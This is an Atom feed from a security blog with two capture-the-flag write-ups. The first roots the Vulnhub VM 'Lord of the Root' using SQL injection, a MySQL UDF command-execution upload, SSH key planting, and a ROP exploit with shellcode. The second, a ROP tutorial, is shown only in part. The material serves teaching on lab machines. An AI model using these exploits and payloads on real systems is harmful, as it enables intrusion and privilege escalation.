<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vm | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/vm/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-10-04T11:23:41+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Lord of the Root]]></title>
    <link href="http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/"/>
    <updated>2015-10-04T10:02:33+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/10/04/lord-of-the-root</id>
    <content type="html"><![CDATA[<p>I figured I&rsquo;d try another VM from Vulnhub for a change. This is Lord of the Root v1.0.1.</p>

<!--more-->


<p><em>Note</em>: Before I could even start the VM with Virtualbox, I had to unpack the .ova, delete the .mf file and remove xml entries from the .ovf file.</p>

<p>The first portscan yielded only ssh as an open port. Upon connecting we get this banner:</p>

<pre><code class="bash">$ ssh root@192.168.56.101

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
root@192.168.56.101's password:
</code></pre>

<p>&ldquo;Knock Friend to Enter&rdquo; and &ldquo;Easy as 1,2,3&rdquo; so that has to be port-knocking. I tried to &ldquo;knock&rdquo; with <code>nc</code>, but that didn&rsquo;t work. I hoped the sequence was indeed 1,2,3 so I just used nmap to do it:</p>

<pre><code class="bash">$ nmap -n -T4 -sV -Pn -r 192.168.56.101 -p1,2,3

Starting Nmap 6.00 ( http://nmap.org ) at 2015-10-04 10:15 CEST
Nmap scan report for 192.168.56.101
Host is up.
PORT  STATE    SERVICE     VERSION
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
</code></pre>

<p>And after this, port 1337 was open:</p>

<pre><code class="bash">1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
</code></pre>

<p>It&rsquo;s a webserver that serves a single page. I tried to view robots.txt but was given another picture (two hipster hobbits or something). However, the page source contained <code>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</code>. Let&rsquo;s decode that base64:</p>

<pre><code class="bash">$ echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' |base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
$ echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' |base64 -d
/978345210/index.php
</code></pre>

<p>OK so I browsed to that location. It&rsquo;s a login page that is vulnerable to SQLi. I had a hard time finding and exploiting it, because I made a silly mistake. I dumped the database I needed, finally, with this command:</p>

<pre><code class="bash">$ python ./sqlmap.py -u "http://192.168.56.101:1337/978345210/index.php" --data="username=bleh&amp;password=d&amp;submit= Login " --risk 3 --level 3 --dump -D Webapp -t password --dbms=mysql
</code></pre>

<p>In first instance, however, I only used <code>--data "username=bleh&amp;password=d</code>, which prevented SQLmap from finding the SQLi. Note to future self: <em>always</em> include <em>all</em> form parameters!</p>

<p>Anyway, dumping all the data from the db took too long because it was blind SQLi so I just dumped <code>Webapp</code> once I found the database names. Long live SQLmap! This database contained usernames based on Lord of the Rings. I tried logging in to the webpage but couldn&rsquo;t find anything interesting. I tried the five usernames against ssh and struck gold with <code>smeagol:MyPreciousR00t</code>.</p>

<p>From here, there were two ways to root the box: one via a suid binary, one via <code>mysql</code>. I&rsquo;ll start with the SQL route.</p>

<h2>Root via mysql</h2>

<p><code>mysql</code> is running as root:</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ ps aux |grep sql
root      1085  2.0  4.2 318220 43072 ?        Ssl  04:07   0:26 /usr/sbin/mysqld
</code></pre>

<p>That&rsquo;s really nice. I grabbed the login from the web source:</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ cat /var/www/978345210/login.php 
&lt;?php
session_start(); // Starting Session
$error=''; // Variable To Store Error Message
if (isset($_POST['submit'])) {
    if (empty($_POST['username']) || empty($_POST['password'])) {
        $error = "Username or Password is invalid";
    }
    else
    {
        // Define $username and $password
        $username=$_POST['username'];
        $password=$_POST['password'];
        $db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');

        // To protect MySQL injection for Security purpose
        $username = stripslashes($username);
        $password = stripslashes($password);

        $sql="select username, password from Users where username='".$username."' AND password='".$password."';";
        //echo $sql;
                $query = $db-&gt;query($sql);
                $rows = $query-&gt;num_rows;

        if ($rows == 1) {
            $_SESSION['login_user']=$username; // Initializing Session
            header("location: profile.php"); // Redirecting To Other Page
        } else {
            $error = "Username or Password is invalid";
        }
    }
}
?&gt;
</code></pre>

<p>We can now login to <code>mysql</code> as root and upload <code>lib_mysqludf_sys</code> to enable command execution. I ripped parts from my <a href="https://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/">Kvasir</a> writeup. I cloned the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys</a> repo and ran the following commands:</p>

<pre><code class="bash">echo "SELECT 0x" &gt; payload
cat lib_mysqludf_sys.so |xxd -p &gt;&gt; payload
echo " INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exploit.so'; " &gt;&gt; payload
</code></pre>

<p><code>payload</code> was ran through <code>tr -d '\n'</code> to remove newlines and the output of that command was entered into the mysql prompt. This creates the <code>udf_exploit.so</code> file on the remote box. From there, I ran:</p>

<pre><code class="bash">mysql&gt; CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so'; 
Query OK, 0 rows affected (0.00 sec)
</code></pre>

<p>I created ssh keys for this joyous occasion and upload the public key to the root directory:</p>

<pre><code class="bash">mysql&gt; SELECT "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhzEQ1uE0pjtDVHQZg17PP1rihY0ju7u0fBSJax/oAfxWXia9e229BpW+P6U08zEE4FhnhKdy4Tqyz8sdqwiPFldi8MkzA68oWBP5QwwGBF+CGrsQ7b8CLDSESPOKMx8uTz71OJObHRzC6Vtuhe9CD3unoTw5i1XNRq/Hl3Zm/BaYQB9yQMA6FoE7qt8UhZS1uis9EsNGvUSvYdrRUM7XiWEsml6Q9EGFs0jVZn/UGCr4rD/t0yqNtAKtH+9j2GRbh2pKTynfFXuHTzzODtiHzbEfmO/ma4B2gcyEzj+FBHxhwZAWQ349Fy/m1oDUJsbnk+tlLbdbPoDOTeS1nOAzD" INTO OUTFILE '/root/.ssh/autorized_keys';
Query OK, 1 row affected (0.00 sec)

mysql&gt; SELECT sys_exec("chmod 600 /root/.ssh/authorized_keys");
+--------------------------------------------------+
| sys_exec("chmod 600 /root/.ssh/authorized_keys") |
+--------------------------------------------------+
|                                                0 |
+--------------------------------------------------+
1 row in set (0.02 sec)
</code></pre>

<p>Now I could ssh in as root:</p>

<pre><code class="bash">$ ssh root@192.168.56.101 -i ./rootkey

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

                            .____    _____________________________                              
                            |    |   \_____  \__    ___/\______   \                             
                            |    |    /   |   \|    |    |       _/                             
                            |    |___/    |    \    |    |    |   \                             
                            |_______ \_______  /____|    |____|_  /                             
                                    \/       \/                 \/                              
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
 \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | 
       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
Last login: Sun Oct  4 04:38:51 2015 from 192.168.56.1
root@LordOfTheRoot:~# 
</code></pre>

<p>So that&rsquo;s the <code>mysql</code> route. Now on to the binary!</p>

<h2>Vulnerable binary</h2>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ find / -perm -4000 -type f 2&gt;/dev/null
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/bin/ping6
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
</code></pre>

<p>Ah, interesting. This reminds me of knock-knock.</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ md5sum /SECRET/door*/file
f0c663095117d908e16412570d2c6252  /SECRET/door1/file
f0c663095117d908e16412570d2c6252  /SECRET/door2/file
bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door3/file
</code></pre>

<p>I grabbed <code>door3</code> and started analysing it on my local box. It contains a <code>strcpy</code> that allows us to control EIP.</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ objdump -d -M intel --no-show-raw-insn /SECRET/door3/file |less

0804845d &lt;main&gt;:
 804845d:       push   ebp
 804845e:       mov    ebp,esp
 8048460:       and    esp,0xfffffff0
 8048463:       sub    esp,0xb0
 8048469:       cmp    DWORD PTR [ebp+0x8],0x1
 804846d:       jg     8048490 &lt;main+0x33&gt;
 804846f:       mov    eax,DWORD PTR [ebp+0xc]
 8048472:       mov    eax,DWORD PTR [eax]
 8048474:       mov    DWORD PTR [esp+0x4],eax
 8048478:       mov    DWORD PTR [esp],0x8048540
 804847f:       call   8048310 &lt;printf@plt&gt;
 8048484:       mov    DWORD PTR [esp],0x0
 804848b:       call   8048340 &lt;exit@plt&gt;
 8048490:       mov    eax,DWORD PTR [ebp+0xc]
 8048493:       add    eax,0x4
 8048496:       mov    eax,DWORD PTR [eax]
 8048498:       mov    DWORD PTR [esp+0x4],eax
 804849c:       lea    eax,[esp+0x11]
 80484a0:       mov    DWORD PTR [esp],eax
 80484a3:       call   8048320 &lt;strcpy@plt&gt;
 80484a8:       mov    eax,0x0
 80484ad:       leave  
 80484ae:       ret    
 80484af:       nop
</code></pre>

<p>I quickly found that I had to run the binary with the first argument containing 171 chars + EIP to overwrite the saved return address on the stack. Let&rsquo;s see how we can spawn a shell&hellip;</p>

<pre><code class="bash">$ gdb -q ./door3
Reading symbols from /home/bas/downloads/LotR/door3...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>Okay, so no protections whatsoever. We could place shellcode on the stack and pwn like it&rsquo;s 1999.</p>

<pre><code class="bash">gdb-peda$ r $(python -c 'print "A"*171+"BBBBCCCC"')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fbeff4 --&gt; 0x15fd7c 
ECX: 0x0 
EDX: 0xb4 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd530 ("CCCC")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 ("CCCC")
0004| 0xffffd534 --&gt; 0xffffd500 ('A' &lt;repeats 44 times&gt;, "BBBBCCCC")
0008| 0xffffd538 --&gt; 0xffffd5e0 --&gt; 0xffffd7e5 ("ORBIT_SOCKETDIR=/tmp/orbit-bas")
0012| 0xffffd53c --&gt; 0xf7fde860 --&gt; 0xf7e5f000 --&gt; 0x464c457f 
0016| 0xffffd540 --&gt; 0xf7ff4821 (mov    eax,DWORD PTR [ebp-0x10])
0020| 0xffffd544 --&gt; 0xffffffff 
0024| 0xffffd548 --&gt; 0xf7ffcff4 --&gt; 0x1cf2c 
0028| 0xffffd54c --&gt; 0x8048249 ("__libc_start_main")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
</code></pre>

<p>Let&rsquo;s just jump to the stack! However, there is no <code>jmp esp</code> opcode in the binary, so it looks like we have a problem. ASLR <em>is</em> enabled on the remote box and none of the registers point directly to the &ldquo;shellcode&rdquo; on the stack. We can hardcode the stack address but that will lead to lots of failed attempts. Let&rsquo;s be smart about this.</p>

<p>Verify no <code>jmp esp</code>:</p>

<pre><code class="bash">gdb-peda$ asmsearch "jmp esp"
Searching for ASM code: 'jmp esp' in: binary ranges
0x08048365 : (83e4) and    esp,0xfffffff0
0x08048460 : (83e4) and    esp,0xfffffff0
0x08048c1b : (00e4) add    ah,ah
0x08049365 : (83e4) and    esp,0xfffffff0
0x08049460 : (83e4) and    esp,0xfffffff0
gdb-peda$ asmsearch "call esp"
Searching for ASM code: 'call esp' in: binary ranges
0x0804864f : (00d4) add    ah,dl
0x08048a6f : (00d4) add    ah,dl
0x08048a73 : (08d4) or     ah,dl
0x08048e0f : (00d4) add    ah,dl
0x0804964f : (00d4) add    ah,dl
gdb-peda$ find "\xff\xd4" binary
Searching for '\xff\xd4' in: binary ranges
Not found
gdb-peda$ find "\xff\xe4" binary
Searching for '\xff\xe4' in: binary ranges
Not found
</code></pre>

<p>However, we do have <code>strcpy</code> and this memory region:</p>

<pre><code class="bash">gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x08049000 r-xp  /home/bas/downloads/LotR/door3
0x08049000 0x0804a000 rwxp  /home/bas/downloads/LotR/door3
</code></pre>

<p><code>0x08049000</code> is <code>rwx</code>! We can now use <code>strcpy</code> to write <code>ff e4</code> to memory and return to it, which bypasses ASLR because the binary is always loaded on the same address. Let&rsquo;s ROP this! <code>strcpy@plt</code> is at 0x8048320 but we can&rsquo;t use that address because it contains a space. We&rsquo;ll just use strcpy+6, which jumps to the resolver to resolve strcpy.</p>

<pre><code class="bash">gdb-peda$ x/4i 0x8048320
   0x8048320 &lt;strcpy@plt&gt;:  jmp    DWORD PTR ds:0x8049740
   0x8048326 &lt;strcpy@plt+6&gt;:    push   0x8
   0x804832b &lt;strcpy@plt+11&gt;:   jmp    0x8048300
   0x8048330 &lt;__gmon_start__@plt&gt;:  jmp    DWORD PTR ds:0x8049744
</code></pre>

<p>With that out of the way, we need a pop2ret to balance the stack. This is easily located with gdb-peda&rsquo;s <code>ropgadget</code> command and I chose 0x804850e. Last thing I needed was the address of the bytes <code>0xff</code> and <code>0xe4</code> and again gdb-peda provided those. Putting the ROP chain together:</p>

<pre><code class="python">import struct
def p(x):
    return struct.pack('&lt;L', x)

def write(what, where):
    # strcpy(dest, src)
    # use strcpy+6 otherwise the address will contain a space, messes up argv
    # second address is pop2ret
    return p(0x8048326)+p(0x804850e)+p(where)+p(what)

z = ""
z += "A"*171
z += write(0x804852c, 0x8049330) # ff
z += write(0x8048366, 0x8049331) # e4 jmp esp
z += p(0x8049330)
# modified /bin/ash shellcode: http://shell-storm.org/shellcode/files/shellcode-547.php
z += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
z += "\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
z += "\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
z += "\x80\x31\xc0\xb0\x01\xcd\x80"
</code></pre>

<p>Death to nopsleds!</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ md5sum /SECRET/door*/file
f0c663095117d908e16412570d2c6252  /SECRET/door1/file
bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door2/file
f0c663095117d908e16412570d2c6252  /SECRET/door3/file
smeagol@LordOfTheRoot:~$ /SECRET/door2/file $(python poc.py)
# whoami
root
# id
uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
# 
</code></pre>

<p>And there you go. A reliable way to spawn a root shell from that vulnerable binary. Game over.</p>

<pre><code class="bash"># cat /root/Flag*
"There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power."
– Gandalf
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP Primer - Level0]]></title>
    <link href="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/"/>
    <updated>2015-06-28T19:45:38+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/06/28/rop-primer-level0</id>
    <content type="html"><![CDATA[<p>The ROP VM which I made for this exercise can be downloaded from <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">vulnhub.com</a>. Version 0.2 is fixed, as the home dirs had improper permissions (thanks to faleur and marky for notifying me). We&rsquo;re up against the binary <code>level0</code>. In this case, we have the source code, which helps tremendously. Nevertheless, start by treating it as a blackbox.</p>

<!--more-->


<p>First, enable coredumps.</p>

<pre><code class="bash">seb@minol:~/tmp$ ulimit -c unlimited
</code></pre>

<p>Then, make sure you&rsquo;re not running the exploits against a SUID binary. Linux, by default, will <em>not</em> generate coredumps for SUID binaries. Fair enough. Thanks to @Swappage for alerting me during the workshop!</p>

<pre><code class="bash">seb@minol:~/tmp$ # remember, coredumps don't work on suid binaries
seb@minol:~/tmp$ # so cp ./level0 (suid level1) to ./level0b
</code></pre>

<p>Finally, disassemble the binary with <code>objdump</code>:</p>

<pre><code class="bash">seb@minol:~/tmp$ objdump -d -M intel ./level0 &gt; level0.out
seb@minol:~/tmp$ # -M intel will use the Intel syntax instead of AT&amp;T's syntax.
</code></pre>

<p>In some cases, the binary is the only thing given, with no source code available. The disassembly will help to get an understanding of what the binary is doing.</p>

<p>Another useful command is <code>file</code>:</p>

<pre><code class="bash">seb@minol:~/tmp$ file ./level0
./level0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=0x52c391fb68f9d0b47e49220dfe408334f8fdd088, not stripped
</code></pre>

<p>This tells us that the binary is 32 bit and statically linked, which explains its large size.</p>

<p>Let&rsquo;s have a look at the disassembly of <code>main()</code>:</p>

<pre><code>08048254 &lt;main&gt;:
 8048254:       55                      push   ebp
 8048255:       89 e5                   mov    ebp,esp
 8048257:       83 e4 f0                and    esp,0xfffffff0
 804825a:       83 ec 30                sub    esp,0x30
 804825d:       c7 04 24 68 b6 0a 08    mov    DWORD PTR [esp],0x80ab668
 8048264:       e8 d7 0c 00 00          call   8048f40 &lt;_IO_puts&gt;
 8048269:       c7 04 24 80 b6 0a 08    mov    DWORD PTR [esp],0x80ab680
 8048270:       e8 0b 0b 00 00          call   8048d80 &lt;_IO_printf&gt;
 8048275:       8d 44 24 10             lea    eax,[esp+0x10]
 8048279:       89 04 24                mov    DWORD PTR [esp],eax
 804827c:       e8 2f 0b 00 00          call   8048db0 &lt;_IO_gets&gt;
 8048281:       8d 44 24 10             lea    eax,[esp+0x10]
 8048285:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048289:       c7 04 24 98 b6 0a 08    mov    DWORD PTR [esp],0x80ab698
 8048290:       e8 eb 0a 00 00          call   8048d80 &lt;_IO_printf&gt;
 8048295:       b8 00 00 00 00          mov    eax,0x0
 804829a:       c9                      leave  
 804829b:       c3                      ret    
</code></pre>

<p>We have a classic buffer overflow situation here:</p>

<pre><code> 8048275:       8d 44 24 10             lea    eax,[esp+0x10]
 8048279:       89 04 24                mov    DWORD PTR [esp],eax
 804827c:       e8 2f 0b 00 00          call   8048db0 &lt;_IO_gets&gt;
</code></pre>

<p>The <code>lea</code> command will load a stack address into <code>eax</code>. That address is put on the stack as an argument for <code>_IO_gets</code>, which will happily read more than enough bytes from STDIN to overflow the buffer and overwrite the saved return address on the stack.</p>

<p>Let&rsquo;s switch to <code>gdb-peda</code> and see the binary in action.</p>

<pre><code class="bash">seb@minol:~/tmp$ # gdb -q is quiet startup, so it won't print out lots of info. Not strictly necessary. 
seb@minol:~/tmp$ gdb ./level0 -q
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre>

<p><code>checksec</code> is a very useful command available in <code>gdb-peda</code> (not in vanilla <code>gdb</code>). In this case, one can see that only NX is enabled, meaning that the stack, heap and other data sections are not executable, whereas code sections are executable but not writeable. Let&rsquo;s check this within <code>gdb</code>. First, enter <code>start</code> to run the binary and break at the <code>main()</code> function automatically. Then, inspect the memory layout with <code>vmmap</code>, which will show memory regions that are active in memory along with their memory protection flags.</p>

<pre><code class="bash">gdb-peda$ start
[----------------------------------registers-----------------------------------]
EAX: 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
EBX: 0x0 
ECX: 0x1 
EDX: 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x193a5dce 
EBP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
ESP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
EIP: 0x8048257 (&lt;main+3&gt;:   and    esp,0xfffffff0)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804824f &lt;frame_dummy+63&gt;:  jmp    0x80481a0 &lt;register_tm_clones&gt;
   0x8048254 &lt;main&gt;:    push   ebp
   0x8048255 &lt;main+1&gt;:  mov    ebp,esp
=&gt; 0x8048257 &lt;main+3&gt;:  and    esp,0xfffffff0
   0x804825a &lt;main+6&gt;:  sub    esp,0x30
   0x804825d &lt;main+9&gt;:  mov    DWORD PTR [esp],0x80ab668
   0x8048264 &lt;main+16&gt;: call   0x8048f40 &lt;puts&gt;
   0x8048269 &lt;main+21&gt;: mov    DWORD PTR [esp],0x80ab680
[------------------------------------stack-------------------------------------]
0000| 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
0004| 0xbffff61c --&gt; 0x8048445 (&lt;__libc_start_main+421&gt;:    mov    DWORD PTR [esp],eax)
0008| 0xbffff620 --&gt; 0x1 
0012| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
0016| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
0020| 0xbffff62c --&gt; 0x0 
0024| 0xbffff630 --&gt; 0x0 
0028| 0xbffff634 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x08048257 in main ()
gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x080ca000 r-xp  /home/seb/tmp/level0
0x080ca000 0x080cb000 rw-p  /home/seb/tmp/level0
0x080cb000 0x080ef000 rw-p  [heap]
0xb7fff000 0xb8000000 r-xp  [vdso]
0xbffdf000 0xc0000000 rw-p  [stack]
</code></pre>

<p>The output of <code>vmmap</code> clearly shows NX in effect: the stack is marked writeable but not executable; the binary, loaded at 0x8048000, is marked executable but not writeable.</p>

<p>So far, so good. Let&rsquo;s continue to run the binary with <code>c</code> and try to overwrite the saved return address on the stack, taking advantage of the <code>_IO_gets</code> call. Note: you can use a patterned buffer for this as well, check out <code>pattern_create</code> and <code>pattern_offset</code> in gdb-peda.</p>

<pre><code class="bash">gdb-peda$ c
[+] ROP tutorial level0
[+] What's your name? AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL
[+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
EDX: 0x80cb690 --&gt; 0x0 
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x687af80d 
EBP: 0x4b4b4b4b ('KKKK')
ESP: 0xbffff620 --&gt; 0x0 
EIP: 0x4c4c4c4c ('LLLL')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x4c4c4c4c
[------------------------------------stack-------------------------------------]
0000| 0xbffff620 --&gt; 0x0 
0004| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
0008| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
0012| 0xbffff62c --&gt; 0x0 
0016| 0xbffff630 --&gt; 0x0 
0020| 0xbffff634 --&gt; 0x0 
0024| 0xbffff638 --&gt; 0x0 
0028| 0xbffff63c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x4c4c4c4c in ?? ()
</code></pre>

<p>Lucky shot. <code>eip</code> loaded with <code>LLLL</code> because we&rsquo;ve overwritten the return address for <code>main()</code> on the stack. As soon as the <code>ret</code> at the end of <code>main()</code> was executed, it popped the value off of the top of the stack into <code>eip</code> and increased <code>esp</code> with four. Because we&rsquo;ve overwritten that value, we now control <code>eip</code>. To have a look at the stack, issue the following command:</p>

<pre><code>gdb-peda$ x/20wx $esp-48
0xbffff5f0: 0x41414141  0x42424242  0x43434343  0x44444444
0xbffff600: 0x45454545  0x46464646  0x47474747  0x48484848
0xbffff610: 0x49494949  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c
0xbffff620: 0x00000000  0xbffff6b4  0xbffff6bc  0x00000000
0xbffff630: 0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p><code>x</code> stands for inspect, with the format specifier and amount after the slash (in this case, 20 DWORDS). Finally, give it the address from which you want to inspect. In this case, I chose <code>$esp-48</code>, which is the start of the buffer on the stack. Confirm that this is our input.</p>

<p>So let&rsquo;s use this first bit of information and write a script to reliably overwrite the saved return address on the stack. This will serve as the skeleton for our exploit.</p>

<pre><code class="python">import struct

# this is a helper function, which will take a 32-bit value and convert it to little-endian.
def p(x):
    return struct.pack('&lt;L', x)

# start our payload as a string of character.
payload = ""

# add padding to overwrite upto the saved return address.
payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

# this part should overwrite the saved return address on the stack.
payload += p(0xdeadbeef)

# make sure to output the rop chain.
print payload
</code></pre>

<p>To verify that this will return to <code>0xdeadbeef</code> by overwriting the saved return address, we have two options:</p>

<ol>
<li>run it outside of gdb and inspect the coredump that is generated</li>
<li>run it, store the rop chain in a file and run the binary in gdb with the file as input</li>
</ol>


<h2>Method 1</h2>

<p>Running the exploit in this way is the most accurate way, at least as far as memory layout and stack addresses are concerned. There might be a discrepancy between memory addresses when running within <code>gdb</code> vs outside of <code>gdb</code>. There is a way to fix this, using <a href="">fixenv</a>: I did not know of this solution until BSides!
<code>``bash
seb@minol:~/tmp$ python poc.py | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
Segmentation fault (core dumped)
seb@minol:~/tmp$ gdb -q ./level0 core
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
[New LWP 2922]
Core was generated by</code>./level0&#8217;.
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0xdeadbeef in ?? ()</h1>

<p>gdb-peda$
&#8220;`</p>

<h2>Method 2</h2>

<p>This method is especially useful if you need to inspect the memory with <code>vmmap</code>: <code>gdb</code> cannot display memory layout of a coredump!</p>

<pre><code class="bash">seb@minol:~/tmp$ python poc.py &gt; input_for_bin
seb@minol:~/tmp$ gdb -q ./level0
